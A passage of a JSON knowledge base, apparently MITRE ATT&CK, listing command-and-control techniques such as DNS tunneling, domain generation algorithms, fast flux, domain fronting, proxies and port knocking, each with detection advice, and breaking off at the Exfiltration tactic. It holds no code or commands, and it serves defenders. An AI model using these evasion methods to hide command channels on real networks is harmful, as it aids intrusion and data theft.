        "description": " \nAdversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data. \n\n"
      },
      "T1071.004": {
        "name": "DNS",
        "description": " \nAdversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.  \n \n  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data. Monitor for DNS traffic to/from known-bad or suspicious domains.\n\n"
      },
      "T1092": {
        "name": "Communication Through Removable Media",
        "description": " \nAdversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system. Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by  Replication Through Removable Media . Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.  ",
        "detection": "\nMonitor file access on removable media. Detect processes that execute when removable media is mounted.\n\n"
      },
      "T1132": {
        "name": "Data Encoding",
        "description": " \nAdversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.  \n  \nSome data encoding systems may also result in data compression, such as gzip.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.  \n\n"
      },
      "T1132.001": {
        "name": "Standard Encoding",
        "description": " \nAdversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.  \n  \nSome data encoding systems may also result in data compression, such as gzip.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1132.002": {
        "name": "Non-Standard Encoding",
        "description": " \nAdversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a non-standard data encoding system that diverges from existing protocol specifications. Non-standard data encoding schemes may be based on or related to standard data encoding schemes, such as a modified Base64 encoding for the message body of an HTTP request.  \n  \n  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1001": {
        "name": "Data Obfuscation",
        "description": " \nAdversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.  \n\n"
      },
      "T1001.001": {
        "name": "Junk Data",
        "description": " \nAdversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1001.002": {
        "name": "Steganography",
        "description": " \nAdversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1001.003": {
        "name": "Protocol Impersonation",
        "description": " \nAdversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic. \nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1568": {
        "name": "Dynamic Resolution",
        "description": " \nAdversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control. \nAdversaries may use dynamic resolution for the purpose of  Fallback Channels . When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.  \n \n \n ",
        "detection": "\nDetecting dynamically generated C2 can be challenging due to the number of different algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There are multiple approaches to detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more  . CDN domains may trigger these detections due to the format of their domain names. In addition to detecting algorithm generated domains based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.\n\n"
      },
      "T1568.001": {
        "name": "Fast Flux DNS",
        "description": " \nAdversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.  \n \n \n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.  \n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.  ",
        "detection": "\nIn general, detecting usage of fast flux DNS is difficult due to web traffic load balancing that services client requests quickly. In single flux cases only IP addresses change for static domain names. In double flux cases, nothing is static. Defenders such as domain registrars and service providers are likely in the best position for detection.\n\n"
      },
      "T1568.002": {
        "name": "Domain Generation Algorithms",
        "description": " \nAdversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.  \n \n \n\nDGAs can take the form of apparently random or \"gibberish\" strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.  \n \n \n \n\nAdversaries may use DGAs for the purpose of  Fallback Channels . When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.  \n \n \n ",
        "detection": "\nDetecting dynamically generated domains can be challenging due to the number of different DGA algorithms, constantly evolving malware families, and the increasing complexity of the algorithms. There is a myriad of approaches for detecting a pseudo-randomly generated domain name, including using frequency analysis, Markov chains, entropy, proportion of dictionary words, ratio of vowels to other characters, and more.  CDN domains may trigger these detections due to the format of their domain names. In addition to detecting a DGA domain based on the name, another more general approach for detecting a suspicious domain is to check for recently registered names or for rarely visited domains.Machine learning approaches to detecting DGA domains have been developed and have seen success in applications. One approach is to use N-Gram methods to determine a randomness score for strings used in the domain name. If the randomness score is high, and the domains are not whitelisted (CDN, etc), then it may be determined if a domain is related to a legitimate host or DGA.  Another approach is to use deep learning to classify domains as DGA-generated. \n\n"
      },
      "T1568.003": {
        "name": "DNS Calculation",
        "description": " \nAdversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.  \n\nOne implementation of  DNS Calculation is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.  \n \n \n ",
        "detection": "\nDetection for this technique is difficult because it would require knowledge of the specific implementation of the port calculation algorithm. Detection may be possible by analyzing DNS records if the algorithm is known.\n\n"
      },
      "T1573": {
        "name": "Encrypted Channel",
        "description": " \nAdversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.  ",
        "detection": "\nSSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.  SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1573.001": {
        "name": "Symmetric Cryptography",
        "description": " \nAdversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.  ",
        "detection": "\nWith symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1573.002": {
        "name": "Asymmetric Cryptography",
        "description": " \nAdversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal. \nFor efficiency, may protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as  Asymmetric Cryptography .  ",
        "detection": "\nSSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels.  SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1008": {
        "name": "Fallback Channels",
        "description": " \nAdversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.  \n\n"
      },
      "T1105": {
        "name": "Ingress Tool Transfer",
        "description": " \nAdversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.  ",
        "detection": "\nMonitor for file creation and files transferred into the network. Unusual processes with external network connections creating files on-system may be suspicious. Use of utilities, such as FTP, that does not normally occur may also be suspicious.Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1104": {
        "name": "Multi-Stage Channels",
        "description": " \nAdversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult. \nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features. \nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or  Fallback Channels in case the original first-stage communication path is discovered and blocked.  ",
        "detection": "\nHost data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.\n\n"
      },
      "T1095": {
        "name": "Non-Application Layer Protocol",
        "description": " \nAdversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.  \nSpecific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL). \nICMP communication between hosts is one example.  \nBecause ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts;  \nhowever, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.  ",
        "detection": "\nAnalyze network traffic for ICMP messages or other protocols that contain abnormal data or are not normally seen within or exiting the network. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.  Monitor and investigate API calls to functions associated with enabling and/or utilizing alternative communication channels.\n\n"
      },
      "T1571": {
        "name": "Non-Standard Port",
        "description": " \nAdversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088  \nor port 587  \nas opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.  ",
        "detection": "\nAnalyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. \n\n"
      },
      "T1572": {
        "name": "Protocol Tunneling",
        "description": " \nAdversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. \nThere are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.  \n \n Protocol Tunneling may also be abused by adversaries during  Dynamic Resolution . Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.  \n \nAdversaries may also leverage  Protocol Tunneling in conjunction with  Proxy and/or  Protocol Impersonation to further conceal C2 communications and infrastructure.  ",
        "detection": "\nMonitoring for systems listening and/or establishing external connections using ports/protocols commonly associated with tunneling, such as SSH (port 22). Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data. \n\n"
      },
      "T1090": {
        "name": "Proxy",
        "description": " \nAdversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including  HTRAN , ZXProxy, and ZXPortMap.  \nAdversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic. \nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.  Consider monitoring for traffic to known anonymity networks (such as Tor).\n\n"
      },
      "T1090.001": {
        "name": "Internal Proxy",
        "description": " \nAdversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including  HTRAN , ZXProxy, and ZXPortMap.  \nAdversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment. \nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.  ",
        "detection": "\nAnalyze network data for uncommon data flows between clients that should not or often do not communicate with one another. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1090.002": {
        "name": "External Proxy",
        "description": " \nAdversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including  HTRAN , ZXProxy, and ZXPortMap.  \nAdversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion. \nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.  ",
        "detection": "\nAnalyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. \n\n"
      },
      "T1090.003": {
        "name": "Multi-hop Proxy",
        "description": " \nTo disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network.  \n\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging  Patch System Image , adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the  Network Boundary Bridging method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN. Protocols such as ICMP may be used as a transport.  ",
        "detection": "\nWhen observing use of Multi-hop proxies, network data from the actual command and control servers could allow correlating incoming and outgoing flows to trace malicious traffic back to its source. Multi-hop proxies can also be detected by alerting on traffic to known anonymity networks (such as Tor) or known adversary infrastructure that uses this technique.In context of network devices, monitor traffic for encrypted communications from the Internet that is addressed to border routers.  Compare this traffic with the configuration to determine whether it matches with any configured site-to-site Virtual Private Network (VPN) connections the device was intended to have. Monitor traffic for encrypted communications originating from potentially breached routers that is addressed to other routers within the organization.  Compare the source and destination with the configuration of the device to determine if these channels are an authorized Virtual Private Network (VPN) connections or other encrypted modes of communication. Monitor ICMP traffic from the Internet that is addressed to border routers and is encrypted.  Few if any legitimate use cases exist for sending encrypted data to a network device via ICMP.\n\n"
      },
      "T1090.004": {
        "name": "Domain Fronting",
        "description": " \nAdversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS.  \nDomain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored). \nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.  ",
        "detection": "\nIf SSL inspection is in place or the traffic is not encrypted, the Host field of the HTTP header can be checked if it matches the HTTPS SNI or against a blocklist or allowlist of domain names.  \n\n"
      },
      "T1219": {
        "name": "Remote Access Software",
        "description": " \nAn adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.  \n\nRemote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system. \nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.  \n  \n ",
        "detection": "\nMonitor for applications and processes related to remote admin tools. Correlate activity with other suspicious behavior that may reduce false positives if these tools are used by legitimate users and administrators.Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used.Domain Fronting may be used in conjunction to avoid defenses. Adversaries will likely need to deploy and/or install these remote tools to compromised systems. It may be possible to detect or prevent the installation of these tools with host-based solutions.\n\n"
      },
      "T1205": {
        "name": "Traffic Signaling",
        "description": " \nAdversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e.  Port Knocking ), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software. \nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s). \nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r  \n, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs. \nOn network devices, adversaries may use crafted packets to enable  Network Device Authentication for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  \n  \n  \nTo enable this traffic signaling on embedded devices, adversaries must first achieve and leverage  Patch System Image due to the monolithic nature of the architecture.  ",
        "detection": "\nRecord network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\n"
      },
      "T1205.001": {
        "name": "Port Knocking",
        "description": " \nAdversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. \nThis technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system. \nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r  \n, is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.  ",
        "detection": "\nRecord network packets sent to and from the system, looking for extraneous packets that do not belong to established flows.\n\n"
      },
      "T1102": {
        "name": "Web Service",
        "description": " \nAdversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. \nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).  ",
        "detection": "\nHost data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity. \n\n"
      },
      "T1102.001": {
        "name": "Dead Drop Resolver",
        "description": " \nAdversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers. \nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. \nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).  ",
        "detection": "\nHost data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. User behavior monitoring may help to detect abnormal patterns of activity. \n\n"
      },
      "T1102.002": {
        "name": "Bidirectional Communication",
        "description": " \nAdversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.  ",
        "detection": "\nHost data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity. \n\n"
      },
      "T1102.003": {
        "name": "One-Way Communication",
        "description": " \nAdversaries may use an existing, legitimate external Web service as a means for sending commands to a compromised system without receiving return output over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems may opt to send the output from those commands back over a different C2 channel, including to another distinct Web service. Alternatively, compromised systems may return no output at all in cases where adversaries want to send instructions to systems and do not want a response. \nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.  ",
        "detection": "\nHost data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows. User behavior monitoring may help to detect abnormal patterns of activity. \n\n"
      }
    }
  },
  "TA0010": {
    "name": "Exfiltration",
    "description": "\nThe adversary is trying to steal data.Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.\n",
    "technique": {
      "T1020": {
        "name": "Automated Exfiltration",
